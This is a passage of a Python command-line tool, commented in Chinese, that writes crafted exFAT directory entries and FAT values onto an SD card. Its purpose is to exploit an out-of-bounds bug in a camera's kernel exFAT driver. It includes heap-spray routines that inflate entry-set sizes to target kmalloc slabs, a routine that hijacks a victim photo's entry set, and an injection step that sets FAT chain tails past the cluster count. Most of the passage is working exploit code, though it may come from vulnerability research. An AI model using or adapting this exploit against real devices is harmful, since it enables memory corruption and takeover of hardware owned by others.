    """诊断：核对位图与 FAT 是否一致（找出"位图说空闲、FAT 说在用"的簇）"""
    bm, start, length = read_bitmap(dev)
    if bm is None:
        print("!! 读不到分配位图"); return 2
    print("== 位图 vs FAT 一致性核查 ==")
    print("  位图 start_clu=%d  长度=%d B  覆盖 %d 簇" % (start, length, length * 8))
    bad = []
    alloc_bit = 0
    alloc_fat = 0
    for i in range(length * 8):
        clu = i + 2
        if clu >= dev.clu_count + 2:
            break
        b = (bm[i >> 3] >> (i & 7)) & 1
        f = dev.fat_get(clu)
        if b: alloc_bit += 1
        if f != 0: alloc_fat += 1
        if b == 0 and f != 0:
            bad.append((clu, f))
    print("  位图标记已分配 : %d 簇" % alloc_bit)
    print("  FAT 非 0 的簇  : %d 簇" % alloc_fat)
    print("  ⚠️ 位图说【空闲】但 FAT 非 0 的簇: %d 个" % len(bad))
    for clu, f in bad[:20]:
        print("     簇 %-8d FAT=0x%08X" % (clu, f))
    if len(bad) > 20:
        print("     ... 还有 %d 个" % (len(bad) - 20))
    if bad:
        print()
        print("  ⇒ 结论：位图与 FAT 不一致！只信位图分配簇会【踩到正在使用的簇】。")
    else:
        print("  ⇒ 位图与 FAT 一致。")
    return 0


def cmd_mkspray(dev, count, num_ext, start_idx=0):
    """★ 堆喷核心：短名字（相机会 stat）+ 篡改 num_ext（撑大 kmalloc 分配）"""
    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
    if dclu is None:
        print("!! 找不到 /DCIM/100_PANA"); return 2
    ents_per_file = num_ext + 1
    bufsize = 8 + ents_per_file * 32
    band = next((b for b in (256, 512, 1024, 2048, 4096) if bufsize <= b), None)
    print("== mkspray ==")
    print("  目录 start_clu = %d" % dclu)
    print("  每个文件: num_ext=%d → %d 个目录项 → bufsize≈%d → kmalloc-%s"
          % (num_ext, ents_per_file, bufsize, band))
    print("  计划创建 %d 个，共需 %d 个目录项（%d 字节）"
          % (count, count * ents_per_file, count * ents_per_file * 32))
    # 1) 收集目录簇链
    chain = []
    c = dclu
    while 2 <= c < dev.clu_count + 2 and len(chain) < 4096:
        chain.append(c)
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    print("  目录簇链: %s (共 %d 簇)" % (chain[:6], len(chain)))
    # 2) 找写入起点（第一个 0x00 结束标记的位置）
    per_clu = dev.cluster_size // 32
    used = 0
    for clu in chain:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        for i in range(per_clu):
            if data[i * 32] == 0x00:
                break
            used += 1
        else:
            continue
        break
    total_slots = len(chain) * per_clu
    print("  已用目录项 = %d，总槽位 = %d，剩余 = %d" % (used, total_slots, total_slots - used))
    need = count * ents_per_file
    # 3) 不够就扩链
    while total_slots - used < need:
        nc = alloc_one_cluster(dev)
        if nc is None:
            print("  !! 没有空闲簇"); return 2
        dev.write(dev.seek_clu(nc), b"\x00" * dev.cluster_size)
        dev.fat_set(chain[-1], nc)
        chain.append(nc)
        total_slots += per_clu
        print("  扩展目录: 新增簇 %d (链长 %d)" % (nc, len(chain)))
    # 4) 逐个写入 entry set
    made = 0
    slot = used
    for k in range(count):
        name = "P%07d.JPG" % (9000000 + start_idx + k)
        dcl = alloc_one_cluster(dev)
        if dcl is None:
            print("  !! 数据簇用尽"); break
        dev.write(dev.seek_clu(dcl), b"\xff\xd8\xff\xe0" + b"\x00" * 200)
        es = build_entry_set(name, num_ext, dcl, 204)
        for j in range(ents_per_file):
            idx = slot + j
            ci = idx // per_clu
            off = dev.seek_clu(chain[ci]) + (idx % per_clu) * 32
            dev.write(off, es[j * 32:(j + 1) * 32])
        slot += ents_per_file
        made += 1
    dev.sync()
    print("  ✅ 已写入 %d 个 entry set（每个 %d 项）" % (made, ents_per_file))
    print("  ⇒ 相机 stat 这些 P9000xxx.JPG 时，会分配 kmalloc-%s 的 entry-set 缓冲" % band)
    return 0




def scan_dir_entries(dev, clu):
    """遍历目录，返回 [(槽位号, entry类型, 簇, 簇内偏移, entry集合起点, num_ext), ...]"""
    out = []
    slot = 0
    c = clu
    while 2 <= c < dev.clu_count + 2 and slot < 200000:
        data = dev.read(dev.seek_clu(c), dev.cluster_size)
        per = dev.cluster_size // 32
        for i in range(per):
            et = data[i * 32]
            if et == 0x00:
                return out, c, slot
            out.append((slot, et, c, i * 32, data))
            slot += 1
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    return out, c, slot


def find_entry_offset(dev, dclu, want_name):
    """在目录里定位某个文件名的 File Entry(0x85)，返回 (簇, 簇内偏移, num_ext, 原entry集合)"""
    c = dclu
    while 2 <= c < dev.clu_count + 2:
        data = dev.read(dev.seek_clu(c), dev.cluster_size)
        i = 0
        while i + 32 <= len(data):
            et = data[i]
            if et == 0x00:
                return None
            if et == 0x85:
                n = data[i + 1] + 1
                if i + n * 32 > len(data):
                    return None
                st = data[i:i + n * 32]
                name = ""
                for e in range(1, n):
                    if st[e * 32] == 0xC1:
                        name += st[e * 32 + 2:e * 32 + 32].decode("utf-16le", "replace")
                if name.rstrip("\x00").upper() == want_name.upper():
                    return (c, i, data[i + 1], data[i:i + n * 32])
                i += n * 32
                continue
            i += 32
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    return None


def cmd_hijack(dev, want_name, num_ext):
    """★ 方案A：把受害者照片的目录项改成【短名 + 篡改 num_ext + 填充载荷】
       目的：删除它时，它自己的 entry-set 缓冲在 exfat_free_cluster() 时【仍然活着】。"""
    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
    if dclu is None:
        print("!! 找不到 /DCIM/100_PANA"); return 2
    if want_name in ("auto", "", None):
        def _spray(n):
            u = n.upper()
            return ("AAAA" in u) or u.startswith("P9000")
        cands = [nm for nm, at, st, sz in list_dir(dev, dclu)
                 if nm.upper().endswith(".JPG") and not _spray(nm)]
        if not cands:
            print("!! 目录里没有相机拍的照片"); return 2
        want_name = cands[0]
        print("[i] auto 选中: %s" % want_name)
    hit = find_entry_offset(dev, dclu, want_name)
    if hit is None:
        print("!! 目录里找不到 %s" % want_name)
        print("   现有文件（前 12 个）:")
        for nm, attr, st, sz in list_dir(dev, dclu)[:12]:
            print("     ", nm)
        return 2
    c0, off0, old_ne, orig = hit
    # 从原 entry set 里取出 stream 信息
    name, first_clu, data_len = "", 0, 0
    n_name = 0
    for e in range(1, old_ne + 1):
        t = orig[e * 32]
        if t == 0xC0:
            n_name = orig[e * 32 + 3]
            first_clu = struct.unpack_from("<I", orig, e * 32 + 20)[0]
            data_len = struct.unpack_from("<Q", orig, e * 32 + 24)[0]
        elif t == 0xC1:
            name += orig[e * 32 + 2:e * 32 + 32].decode("utf-16le", "replace")
    name = name.rstrip("\x00")
    ents = num_ext + 1
    bufsize = 8 + ents * 32
    band = next((b for b in (256, 512, 1024, 2048, 4096) if bufsize <= b), None)
    print("== 方案A：劫持受害者自身的 entry set ==")
    print("  目标文件   : %s" % name)
    print("  原 num_ext : %d（%d 项）" % (old_ne, old_ne + 1))
    print("  新 num_ext : %d（%d 项）" % (num_ext, ents))
    print("  起始簇     : %d   数据长度: %d" % (first_clu, data_len))
    print("  新缓冲大小 : %d B → kmalloc-%s" % (bufsize, band))
    print("  位置       : 簇 %d 内偏移 %d（槽位 %d）"
          % (c0, off0, (c0 - dclu) * (dev.cluster_size // 32) + off0 // 32))
    # 构造新 entry set（名字保持原样 → 相机的命名规则照样认得）
    es = build_entry_set(name, num_ext, first_clu, data_len)
    # 写回（可能跨簇：按槽位逐个写）
    per_clu = dev.cluster_size // 32
    slot0 = off0 // 32
    # 建立 槽位 -> (簇, 簇内偏移)
    chain = []
    c = dclu
    while 2 <= c < dev.clu_count + 2 and len(chain) < 4096:
        chain.append(c)
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    need_slots = slot0 + ents
    if need_slots > len(chain) * per_clu:
        print("  !! 目录空间不足（需要 %d 槽，只有 %d）" % (need_slots, len(chain) * per_clu))
        return 2
    for j in range(ents):
        idx = slot0 + j
        ci = idx // per_clu
        dev.write(dev.seek_clu(chain[ci]) + (idx % per_clu) * 32, es[j * 32:(j + 1) * 32])
    dev.sync()
    print("  ✅ 已写入 %d 项" % ents)
    print()
    print("  ★ 接下来删除这个文件时，内核流程是：")
    print("       查找它 → 分配 kmalloc-%s 缓冲（内容=我们写的目录项）" % band)
    print("       → exfat_free_cluster() 【OOB 就发生在这里，缓冲仍活着】")
    print("       → 最后才 kfree")
    print("  ★ 缓冲前 8 字节 = 0x%02X,%d,0x%02X,0x%02X,... → 当作指针是野地址"
          % (es[0], es[1], es[2], es[3]))
    print()
    global LAST_HIJACK
    LAST_HIJACK = {"name": name, "cluster": first_clu, "num_ext": num_ext}
    print("  受害者起始簇 = %d   ⇒ 下一步用: go2 注入这个簇" % first_clu)
    return 0


def cmd_sessionA(dev, name, num_ext):
    """方案A 一体化：劫持受害者 entry set → 越界注入 → 打印 GO"""
    global LAST_HIJACK
    LAST_HIJACK = {}
    print("############ 方案A：受害者自身 entry set 劫持 ############")
    rc = cmd_hijack(dev, name, num_ext)
    if rc != 0 or not LAST_HIJACK:
        print("!! hijack 失败，终止"); return 2
    clu = LAST_HIJACK["cluster"]
    print()
    print("############ 越界注入（受害者起始簇 %d） ############" % clu)
    rc = cmd_go2(dev, clu, 524290)
    if rc != 0:
        print("!! go2 失败，不要去相机！"); return 2
    print()
    print("############################################################")
    print("###  ★ 拔卡插进相机，【删除 %s】             " % LAST_HIJACK["name"])
    print("###  删完拔卡插回 Mac，在这里按【回车】                     ")
    print("############################################################")
    return 0




def dir_space(dev, dclu, need_slots):
    """返回 (目录簇链, 已用槽位数)；不足时自动扩链。"""
    chain = []
    c = dclu
    while 2 <= c < dev.clu_count + 2 and len(chain) < 8192:
        chain.append(c)
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    per = dev.cluster_size // 32
    used = 0
    for clu in chain:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        done = False
        for i in range(per):
            if data[i * 32] == 0x00:
                done = True; break
            used += 1
        if done:
            break
    while len(chain) * per - used < need_slots:
        nc = alloc_one_cluster(dev)
        if nc is None:
            raise SystemExit("!! 没有空闲簇")
        dev.write(dev.seek_clu(nc), b"\x00" * dev.cluster_size)
        dev.fat_set(chain[-1], nc)
        chain.append(nc)
    return chain, used


def cmd_mkentries(dev, count, namelen, start_idx=0):
    """★ 定因工具：精确写 N 个【指定名字长度】的目录项（空文件，无数据簇，无副档名）
       ⇒ 可精确控制目录总字节数 / entry set 大小 / 跨簇数。"""
    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
    if dclu is None:
        print("!! 找不到 /DCIM/100_PANA"); return 2
    n_name = (namelen + 14) // 15
    num_ext = 1 + n_name
    ents = num_ext + 1
    esz = ents * 32
    total = count * esz
    print("== mkentries ==")
    print("  名字长度 %d → Name项 %d, num_ext %d, entries %d, entry set = %d B"
          % (namelen, n_name, num_ext, ents, esz))
    print("  数量 %d → 目录内容共 %d B (~%d KB)" % (count, total, total // 1024))
    chain, used = dir_space(dev, dclu, count * ents)
    per = dev.cluster_size // 32
    print("  目录簇链: %s (%d 簇, 共 %d 槽位)"
          % (chain[:5], len(chain), len(chain) * per))
    print("  已用 %d 槽，写完后占用 %d 槽 → 占 %d 簇空间"
          % (used, used + count * ents, (used + count * ents + per - 1) // per))
    if len(chain) < 3:
        print("  （当前目录跨 %d 簇）" % len(chain))
    made = 0
    slot = used
    for k in range(count):
        base = "P%07d" % (9000000 + start_idx + k)
        pad = namelen - len(base) - 4
        name = base + ("A" * max(pad, 0)) + ".JPG" if pad > 0 else base + ".JPG"
        dcl = alloc_one_cluster(dev)          # 给真实数据簇（更贴近原始触发场景）
        if dcl is None:
            print("  !! 数据簇用尽，已写 %d 个" % made); break
        dev.write(dev.seek_clu(dcl), b"\xff\xd8\xff\xe0" + b"\x00" * 200)
        es = build_entry_set(name, num_ext, dcl, 204)
        for j in range(ents):
            idx = slot + j
            ci = idx // per
            dev.write(dev.seek_clu(chain[ci]) + (idx % per) * 32, es[j * 32:(j + 1) * 32])
        slot += ents
        made += 1
    dev.sync()
    print("  ✅ 已写 %d 个 entry set，目录内容 %d B" % (made, made * esz))
    return 0




def cmd_trimdir(dev, keep_slots):
    """把 /DCIM/100_PANA 目录从第 keep_slots 个槽位起全部清零。
       ⇒ 不需要重新格式化相机，就能把测试用的目录项清干净。"""
    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
    if dclu is None:
        print("!! 找不到 /DCIM/100_PANA"); return 2
    chain = []
    c = dclu
    while 2 <= c < dev.clu_count + 2 and len(chain) < 8192:
        chain.append(c)
        nxt = dev.fat_get(c)
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    per = dev.cluster_size // 32
    print("== trimdir ==    目录链 %s (%d 簇, %d 槽)"
          % (chain[:5], len(chain), len(chain) * per))
    # 打印保留区内容，确认只保留相机照片
    print("  保留的前 %d 个槽:" % keep_slots)
    slot = 0
    for clu in chain:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        for i in range(per):
            if slot >= keep_slots:
                break
            t = data[i * 32]
            tag = {0x85: "File", 0xC0: "Stream", 0xC1: "Name", 0x00: "(空)"}.get(t, "0x%02X" % t)
            print("    槽 %-4d 类型 %s" % (slot, tag))
            slot += 1
        if slot >= keep_slots:
            break
    cleared = 0
    slot = 0
    for clu in chain:
        data = bytearray(dev.read(dev.seek_clu(clu), dev.cluster_size))
        ch = False
        for i in range(per):
            if slot >= keep_slots and data[i * 32] != 0x00:
                data[i * 32:(i + 1) * 32] = b"\x00" * 32
                cleared += 1; ch = True
            slot += 1
        if ch:
            dev.write(dev.seek_clu(clu), bytes(data))
    dev.sync()
    print("  ✅ 已清零 %d 个槽（从槽 %d 起）" % (cleared, keep_slots))
    print("  ⇒ 目录回到干净状态，相机应能正常开机")
    return 0




def cmd_mkdeleted(dev, count):
    """定因对照：往目录里塞 count 个【已删除条目(0x05)】。
       它们只占目录空间，驱动会直接跳过 ⇒ 不产生任何 entry-set 分配。
       若相机照样崩 ⇒ 触发条件是【目录体量】；若不崩 ⇒ 是【长名分配】。"""
    dclu = find_dir_clu(dev, "/DCIM/100_PANA")
    if dclu is None:
        print("!! 找不到 /DCIM/100_PANA"); return 2
    total = count * 32
    print("== mkdeleted（对照组：只占空间、无分配） ==")
    print("  写入 %d 个已删除条目(0x05) → 目录内容 %d B (~%d KB)"
          % (count, total, total // 1024))
    chain, used = dir_space(dev, dclu, count)
    per = dev.cluster_size // 32
    print("  目录簇链: %s (%d 簇, %d 槽)" % (chain[:5], len(chain), len(chain) * per))
    # 构造一个"已删除的 File 条目"：类型 0x05，其余字节填可识别模式
    ent = bytearray(32)
    ent[0] = 0x05
    for i in range(1, 32):
        ent[i] = (i * 7) & 0xFF
    slot = used
    for k in range(count):
        idx = slot + k
        ci = idx // per
        dev.write(dev.seek_clu(chain[ci]) + (idx % per) * 32, bytes(ent))
    dev.sync()
    print("  ✅ 已写 %d 个已删除条目（占 %d 槽，共 %d 簇）"
          % (count, count, (used + count + per - 1) // per))
    print("  ⇒ 目录体量 ≈ %d KB，但【没有任何 entry-set 分配】" % (total // 1024))
    return 0


def cmd_bitmap(dev):
    """读根目录里的分配位图目录项(0x81)，算出 map_sectors 与越界阈值簇号。"""
    clu = dev.root_clu
    found = False
    while 2 <= clu < dev.clu_count + 2 and not found:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        i = 0
        while i + 32 <= len(data):
            et = data[i]
            if et == 0x00:
                break
            if et == 0x81:                      # Allocation Bitmap
                bm_flags = data[i + 1]
                start = struct.unpack_from("<I", data, i + 0x14)[0]
                length = struct.unpack_from("<Q", data, i + 0x18)[0]
                print("== 分配位图目录项 (0x81) ==")
                print("  BitmapFlags = 0x%02X  start_clu = %d  DataLength = %d 字节"
                      % (bm_flags, start, length))
                map_sectors = ((length - 1) >> dev.bps_shift) + 1
                print()
                print("== 由 DataLength 推出的 map_sectors（内核 kmalloc 的槽位数）==")
                print("  map_sectors = ((%d-1) >> %d) + 1 = %d" % (length, dev.bps_shift, map_sectors))
                idx_shift = dev.bps_shift + 3
                print("  内核索引公式：i = (clu-2) >> %d" % idx_shift)
                print("  槽位 0..%d  = 正常 bitmap 缓冲（合法）" % (map_sectors - 1))
                print("  槽位 %d 起     = 越界区（指向堆上其它对象，内容未知）" % map_sectors)
                thr = (map_sectors << idx_shift) + 2
                print()
                print("== 越界阈值 ==")
                print("  只要 FAT 链尾值 >= %d (0x%X)，(clu-2)>>%d 就会 >= map_sectors → 越界"
                      % (thr, thr, idx_shift))
                print("  例：填 %d → 索引 %d" % (thr, (thr - 2) >> idx_shift))
                print("      填 %d → 索引 %d" % (thr + 4096, ((thr + 4096) - 2) >> idx_shift))
                print()
                print("  ⚠️ 注意 kmalloc 会向上取整到 slab 档位：")
                km = map_sectors * 8
                for band in (128, 192, 256, 512, 1024, 2048, 4096, 8192):
                    if km <= band:
                        print("     %d 字节 → kmalloc-%d：槽位 %d..%d 若被索引到会读到 slab 内填充(通常为 0 → NULL 崩溃)"
                              % (km, band, map_sectors, band // 8 - 1))
                        break
                found = True
            i += 32
        if found:
            break
        nxt = dev.fat_get(clu)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
    if not found:
        print("!! 根目录里没找到 0x81 分配位图目录项")


def cmd_dumpbitmap(dev, outpath):
    """把分配位图完整读出并存盘（用于删除前后比对）。"""
    clu = dev.root_clu
    bm = None
    while 2 <= clu < dev.clu_count + 2 and bm is None:
        data = dev.read(dev.seek_clu(clu), dev.cluster_size)
        i = 0
        while i + 32 <= len(data):
            et = data[i]
            if et == 0x00:
                break
            if et == 0x81:
                start = struct.unpack_from("<I", data, i + 0x14)[0]
                length = struct.unpack_from("<Q", data, i + 0x18)[0]
                bm = (start, length)
            i += 32
        if bm:
            break
        nxt = dev.fat_get(clu)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
    if not bm:
        print("!! 未找到分配位图"); return
    start, length = bm
    buf = bytearray()
    c = start
    while len(buf) < length and 2 <= c < dev.clu_count + 2:
        buf += dev.read(dev.seek_clu(c), min(dev.cluster_size, length - len(buf)))
        nxt = dev.fat_get(c)
        if nxt < 2 or nxt >= dev.clu_count + 2:
            break
        c = nxt
    open(outpath, "wb").write(bytes(buf))
    alloc = sum(bin(b).count("1") for b in buf)
    try:
        json.dump({"boot_ck": boot_checksum(dev.boot_region),
                   "cluster_count": dev.clu_count,
                   "allocated": alloc,
                   "ts": time.strftime("%F %T"),
                   "src": outpath}, open(outpath + ".meta.json", "w"))
    except Exception:
        pass
    print("位图已保存: %s" % outpath)
    print("  start_clu=%d  长度=%d 字节  （覆盖 %d 个簇）" % (start, length, length * 8))
    print("  当前置位(已分配)簇数 = %d" % alloc)
    print("  ← 删除操作后重跑本命令，把两个文件给我比对即可判定内核行为")


def cmd_chain(dev, clu):
    print("FAT 链（从簇 %d）：" % clu)
    seen = 0
    while 2 <= clu < dev.clu_count + 2 and seen < 100000:
        nxt = dev.fat_get(clu)
        flag = ""
        if nxt >= dev.clu_count + 2 and nxt != 0xFFFFFFFF:
            flag = "   <== ★ 越界值！"
        print("  clu %-8d -> 0x%08X (%d)%s" % (clu, nxt, nxt, flag))
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
        seen += 1


def do_patch(dev, start_clu, value, level):
    """把 start_clu 之后那条链尾的 FAT 值改成 value。"""
    # 走到链尾
    clu = start_clu
    path = []
    while 2 <= clu < dev.clu_count + 2:
        nxt = dev.fat_get(clu)
        path.append((clu, nxt))
        if nxt >= 0xFFFFFFF8 or nxt >= dev.clu_count + 2:
            break
        clu = nxt
    if not path:
        raise SystemExit("起点簇无效")
    tail_clu, old = path[-1]
    print("链长 %d，链尾簇 %d，原 FAT 值 = 0x%08X (%d)" % (len(path), tail_clu, old, old))
    print("将写入新值 = 0x%08X (%d)   [%s]" % (value, value, level))

    bak = {}
    if os.path.exists(BACKUP):
        bak = json.load(open(BACKUP))
    bak[str(tail_clu)] = old
    json.dump(bak, open(BACKUP, "w"))

    dev.fat_set(tail_clu, value)
    chk = dev.fat_get(tail_clu)
    print("回读校验：0x%08X %s" % (chk, "✅" if chk == value else "❌"))
    print("原值已备份到 %s（用 restore 还原）" % BACKUP)


def cmd_restore(dev):
    if not os.path.exists(BACKUP):
        raise SystemExit("没有备份文件 %s" % BACKUP)
    bak = json.load(open(BACKUP))
    for k, v in bak.items():
        dev.fat_set(int(k), int(v))
        print("  还原 FAT[%s] = 0x%08X" % (k, int(v)))
    os.remove(BACKUP)
    print("✅ 已还原")


def main():
    a = sys.argv[1:]
    if not a:
        print(__doc__)
        return 2
    mode = a[0]
    if mode == "info":
        cmd_info(Dev(a[1]))
    elif mode == "entries":
        cmd_entries(Dev(a[1]), a[2])
    elif mode == "setfat":
        d = Dev(a[1])
        c = int(a[2]); v = int(a[3], 0)
        oldv = d.fat_get(c)
        d.fat_set(c, v)
        d.sync()
        d.close()
        d2 = Dev(a[1]); got = d2.fat_get(c); d2.close()
        print("FAT[%d]: 0x%08X -> 0x%08X   重开设备复核 = 0x%08X  %s"
              % (c, oldv, v, got, "✅" if got == v else "❌"))
    elif mode == "go1":
        dev = Dev(a[1])
        tc = int(a[2]) if len(a) > 2 and a[2].isdigit() else None
        rp = a[3] if len(a) > 3 else "/DCIM/100_PANA"
        sys.exit(cmd_go1(dev, tc, rp))
    elif mode == "go2":
        d = Dev(a[1])
        tc = int(a[2]) if len(a) > 2 and a[2].isdigit() else None
        ov = int(a[3], 0) if len(a) > 3 else 524290          # 默认 index 128
        sys.exit(cmd_go2(d, tc, ov))
    elif mode == "sessionA":
        sys.exit(cmd_sessionA(Dev(a[1]), a[2], int(a[3])))
    elif mode == "hijack":
        sys.exit(cmd_hijack(Dev(a[1]), a[2], int(a[3])))
    elif mode == "checkalloc":
        sys.exit(cmd_checkalloc(Dev(a[1])))
    elif mode == "mkdeleted":
        sys.exit(cmd_mkdeleted(Dev(a[1]), int(a[2])))
    elif mode == "trimdir":
        sys.exit(cmd_trimdir(Dev(a[1]), int(a[2])))
    elif mode == "mkentries":
        sys.exit(cmd_mkentries(Dev(a[1]), int(a[2]), int(a[3]),
                               int(a[4]) if len(a) > 4 else 0))
    elif mode == "mkspray":
        sys.exit(cmd_mkspray(Dev(a[1]), int(a[2]), int(a[3]),
                             int(a[4]) if len(a) > 4 else 0))
    elif mode == "verdict":
        sys.exit(cmd_verdict(Dev(a[1])))
    elif mode == "go1check":
        sys.exit(cmd_go1check(Dev(a[1])))
    elif mode == "dumpbitmap":
        cmd_dumpbitmap(Dev(a[1]), a[2])
    elif mode == "bitmap":
        cmd_bitmap(Dev(a[1]))
    elif mode == "chain":
        cmd_chain(Dev(a[1]), int(a[2]))
    elif mode in ("--level1", "--level2"):
        dev = Dev(a[1])
        start = int(a[2])
        val = int(a[3], 0)
        if mode == "--level1" and not (2 <= val < dev.clu_count + 2):
            raise SystemExit("第 1 级要求新值落在 [2, ClusterCount+1] 内（当前 ClusterCount=%d）"
                             % dev.clu_count)
        if mode == "--level2" and val < dev.clu_count + 2:
            print("注意：新值 %d 未越界（ClusterCount=%d），不会触发越界写"
                  % (val, dev.clu_count))
        do_patch(dev, start, val, mode)
    elif mode == "restore":
        cmd_restore(Dev(a[1]))
    else:
        print(__doc__)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
